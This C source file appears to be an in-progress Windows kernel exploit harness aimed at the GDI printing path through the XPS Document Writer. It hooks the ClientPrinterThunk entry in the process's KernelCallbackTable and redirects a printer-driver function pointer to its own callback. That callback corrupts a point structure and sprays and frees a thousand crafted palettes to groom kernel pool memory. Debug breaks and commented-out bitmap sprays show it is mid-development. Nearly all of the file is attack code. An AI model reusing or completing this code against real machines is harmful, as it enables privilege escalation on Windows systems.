#include <windows.h>
//#include <wdm.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 

#include <ntstatus.h>
#pragma comment(lib, "ntdll.lib")
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
//#pragma comment(lib,"Ntoskrnl.lib")
typedef WNDOBJ(__stdcall* gEngCreateWnd)(SURFOBJ,HWND, WNDOBJCHANGEPROC,FLONG,INT);
typedef int(__fastcall* gNtGdiExtEscape)(HDC, PWCHAR, INT, INT, INT, LPSTR, INT, LPSTR);
typedef BOOL(__fastcall* gNextBand)(HDC,BOOL, POINTL*, PSIZE);
typedef BOOL(__fastcall* gNtGdiExtTextOutW)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT, DWORD);
typedef NTSTATUS(NTAPI* pUser32_ClientPrinterThunk)(PVOID p);
typedef BOOL(__fastcall* gNtGdiExtTextOut)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT);
typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef void(_stdcall* gDrvDisableDriver)();
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef BOOL(__fastcall* gNtGdiDoBanding)(HDC,BOOL, POINTL,PSIZE);
typedef BOOL(__stdcall* hookFunction)(SURFOBJ,POINTL);


pUser32_ClientPrinterThunk		g_originalCPT = NULL;
PVOID g_ppCPT = NULL;
typedef BOOL(__fastcall* gNtGdiEndDoc)(HDC);
gNtGdiEndDoc ntgdiedobanding;
gNtGdiExtEscape g_NtGdiExtEscape;
typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PVOID FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};

} PEB, * PPEB;


typedef struct _TEB
{
	PVOID NtTib1;
	PVOID NtTib2;
	PVOID NtTib3;
	PVOID NtTib4;
	PVOID NtTib5;
	PVOID NtTib6;
	PVOID NtTib7;
	PVOID EnvironmentPointer;
	PVOID ClientId1;
	PVOID ClientId2;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;

} TEB, * PTEB;


HDC hdc = NULL;
gDrvEnableDriver g_fake = NULL;
void* fDrvEnableDriver1 = NULL;
HDC g_hdc;

HWND hWnd;
HDC hDc;

HDC hMemDC;
static HBITMAP bitmaps[2000];



BOOL testData(SURFOBJ* pso, POINTL* pptl) {
	WNDOBJ* wdo;
	pptl->x = 0xffffffff;
	pptl->y = 0xffffffff;
	printf("Surfobj: %p\n", pso);
	printf("POINTL: %p\n", pptl);
	DebugBreak();


	//DrvSetPixelFormat(pso, 1, hWnd);
	//ExtEscape(g_hdc, WNDOBJ_SETUP, 8, 0, sizeof(WNDOBJ), &wdo);
	ntgdiedobanding(g_hdc);

	LOGPALETTE* lPalette;

	//0x1E3  = 0x7e8+8

	lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0xb4 - 1) * sizeof(PALETTEENTRY));

	lPalette->palNumEntries = 0xb4;
	char buffer[400];
	char source[10];
	strcpy(buffer, "0x41414141");
	strcpy(source, "42");
	for (int i = 0; i < 100; i++) {
		strncat(buffer, source, 2);
	}
	printf("%c\n", buffer);
	lPalette->palVersion = 0x0300;
	static HPALETTE hp[2000];
	memset(lPalette->palPalEntry, strtol(buffer,NULL,16), 0xb4 );
	//memset(lPalette->palPalEntry + 0x0A8, 0x43415254, 4);
	//memset(lPalette->palPalEntry+0x98, 0x444E5745, 4);
	HPALETTE h;
	for (int i = 0; i < 1000; i++) {
		h= CreatePalette(lPalette);
		printf("HBitMap: %d", h);
		hp[i] = h;
	}
	for (int i = 0; i < 1000; i++) {
		DeleteObject(hp[i]);

	}
	
	


	/*
	for (int i = 0; i <= 1000; i++) {
		HANDLE h=CreateCompatibleBitmap(hDc, 100, 100);
		SelectObject(hMemDC, h);
		printf("HBITMAP %d ", h);
	}
	*/
	return TRUE;
}

NTSTATUS NTAPI hookDrvEnableDriver(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA pded) {
	DebugBreak();
	MEMORY_BASIC_INFORMATION thunkMemInfo;
	InterlockedExchangePointer(fDrvEnableDriver1, g_fake);
	VirtualProtect(pded.pdrvfn + 21, sizeof(DRVENABLEDATA), PAGE_EXECUTE_READWRITE, &thunkMemInfo);
	BOOL(*testfn_ptr)() = &testData;
	(pded.pdrvfn + 21)->pfn = (*testfn_ptr);
	return g_fake(iEngineVersion, cj, &pded);

}

int i = 0;
NTSTATUS NTAPI hookCPT(
	PVOID p
)
{
	i++;
	if (i == 4) {
		BOOL(*testfn_ptr)() = &testData;
		MEMORY_BASIC_INFORMATION thunkMemInfo;
		PVOID c = ((PBYTE)p + 24);
		PVOID d = *((ULONG_PTR*)c);
		PVOID e = (PBYTE)d+16;
		PVOID f = *((ULONG_PTR*)e);
		PVOID g = *(ULONG_PTR*)f;
		PVOID h = (PBYTE)g+0x218;
		//PVOID f = &e + 0x218;

		if (!VirtualProtect(h, sizeof(PBYTE), PAGE_EXECUTE_READWRITE, &thunkMemInfo)) {
			printf("Fail to set Read-Write: %d\n", GetLastError());
		}
		*(ULONG_PTR*)h = (*testfn_ptr);
		
		printf("Pointer here: %p\n", &(BYTE)p);
		//f = (*testfn_ptr);
		/*
		printf("%p\n:", c);
		printf("First: %p\n", d);
		printf("Second: %p\n", e);
		printf("Third: %p\n", f);
		printf("Third: %p\n", g);
		printf("Third: %p\n", h);
		*/
	}




	return g_originalCPT(p);
}

DRVENABLEDATA pded;

int main() {
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();
	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;

	MEMORY_BASIC_INFORMATION thunkMemInfo;
	//RtlZeroMemory(&pded, sizeof(DRVENABLEDATA));
	printf("TEB: %p\n", teb);
	printf("PEB: %p\n", teb);
	RECT rect;
	POINTL pointL;
	LPXFORM pxf;
	PSIZE size;
	PERBANDINFO* ppbi;
	const XFORM* lpxf;
	HINSTANCE hinst = GetModuleHandle(NULL);;
	RtlZeroMemory(&pointL, sizeof(POINTL));

	hWnd = CreateWindowW(L"BUTTON", L"TestWindow", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
		CW_USEDEFAULT, CW_USEDEFAULT, 100, 100,
		NULL, NULL, hinst, 0);


	g_hdc = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);


	hDc = GetDC(hWnd);
	hMemDC = CreateCompatibleDC(hDc);


	printf("HDC: %p", g_hdc);
	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;




	HMODULE loadLib = LoadLibrary(TEXT("gdi32full.dll"));
	if (!loadLib) {
		printf("Load gdi32full error: %d", GetLastError());
	}
	gNextBand g_NextBand = (gNextBand)GetProcAddress(loadLib, "NtGdiDoBanding");
	if (!g_NextBand) {
		printf("Get function NextBand error: %d", GetLastError());
	}
	g_NtGdiExtEscape = (gNtGdiExtEscape)GetProcAddress(loadLib, "NtGdiExtEscape");
	if (!g_NtGdiExtEscape) {
		printf("Get function g_NtGdiExtTextOutW error: %d", GetLastError());
	}

	ntgdiedobanding = (gNtGdiEndDoc)GetProcAddress(loadLib, "NtGdiEndDoc");




	StartDocA(g_hdc, &docinfo);

	printf("StartDoc: %d\n", GetLastError());
	StartPage(g_hdc);
	printf("Start Page: %d\n", GetLastError());
	DebugBreak();
	//ExtEscape(g_hdc, WNDOBJ_SETUP, 8, (LPCSTR)&hWnd, 0, (LPSTR)NULL);


	//LPCSTR a = "Test String";
	//TextOutA(g_hdc, 0, 0, a, 11);
	g_ppCPT = &((PVOID*)peb->KernelCallbackTable)[0x67];
	if (!VirtualProtect(g_ppCPT, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
		printf("Fail in set read-write: %d", GetLastError());
	}


	static HPALETTE hp[2000];
	//(*g_NextBand)(g_hdc, 0, &pointL, &size);

	HPALETTE hps;
	LOGPALETTE* lPalette;
	//0x1E3  = 0x7e8+8
	lPalette = (LOGPALETTE*)malloc(0x300);
	lPalette->palNumEntries = 0x1E3;
	lPalette->palVersion = 0x0300;
	/*
	for (int i = 0; i < 10; i++) {
		CreateBitmap(1, 1, 1, 8, NULL);

		
	}
	*/



	

	
	// we need 2 object 0x7F4
	/*
	for (int y = 0; y < 2000; y++) {
		//0x3A3 = 0xFe8
		int i = 0x370;
		bmp = CreateBitmap(i, 1, 1, 32, NULL);
		bitmaps[y] = bmp;
		i++;
	}
	for (int s = 0; s < 2000; s++) {
		DeleteObject(bitmaps[s]);
	}
	*/

	g_originalCPT = InterlockedExchangePointer(g_ppCPT, &hookCPT);
	EndPage(g_hdc);
	


	DestroyWindow(hWnd);
	DebugBreak();

	




	
	//system("pause");
	return 0;
}